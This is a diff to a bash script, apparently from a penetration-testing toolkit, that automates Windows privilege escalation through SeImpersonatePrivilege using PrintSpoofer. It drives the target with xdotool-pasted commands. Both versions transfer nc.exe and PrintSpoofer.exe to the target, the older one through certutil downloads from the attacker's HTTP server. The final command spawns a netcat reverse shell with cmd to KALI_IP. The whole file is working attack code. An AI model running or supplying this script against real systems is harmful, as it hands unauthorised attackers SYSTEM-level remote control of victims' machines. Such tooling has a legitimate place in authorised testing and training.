@@ -1,34 +1,32 @@
 #!/bin/bash
 
 : '
-PrintSpoofer: Reverse shell to KALI_IP:443 using SeImpersonatePrivilege.
+CMD: PrintSpoofer: Reverse shell to KALI_IP:443 using SeImpersonatePrivilege.
 '
 
 # https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeImpersonatePrivilege.md
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+SHELL_PORT_FIELD=$(form_item  "shell port" "number" "shell_port" "1337")
 
-# Generate gui form
-generate_form "Shell port"
+# Generate GUI form
+generate_form "${SHELL_PORT_FIELD}"
 
-PORT=${form_data["Shell port"]}
+SHELL_PORT=${form_data["shell_port"]}
 
-cd ${SCRIPTS_DIR}/fileTransfer/windows/.binaries
-python3 -m http.server 1337 &
-HTTP_PID=$!
+LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
+FILE="nc.exe"
 
-TMP_FOLDER="C:\Temp"
+cmd_upload_file "${LOCATION}" "${FILE}"
+NC_FILE_LOCATION="${FILE_LOCATION}"
+kill "${HTTP_PID}"
 
-paste_command "if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}"
+LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
+FILE="PrintSpoofer.exe"
+
+cmd_upload_file "${LOCATION}" "${FILE}"
+PRINTSPOOFER_FILE_LOCATION="${FILE_LOCATION}"
+kill "${HTTP_PID}"
+
+paste_command "${PRINTSPOOFER_FILE_LOCATION} -c \"${NC_FILE_LOCATION} ${KALI_IP} ${SHELL_PORT} -e cmd\""
 xdotool key Return
-sleep 0.8
-
-paste_command "certutil.exe -urlcache -split -f http://${KALI_IP}:1337/nc.exe ${TMP_FOLDER}\nc.exe && certutil.exe -f -urlcache http://${KALI_IP}:1337/PrintSpoofer.exe ${TMP_FOLDER}\PrintSpoofer.exe"
-xdotool key Return
-sleep 5
-
-paste_command "${TMP_FOLDER}\PrintSpoofer.exe -c \"${TMP_FOLDER}\nc.exe ${KALI_IP} ${PORT} -e cmd\""
-
-kill $HTTP_PID
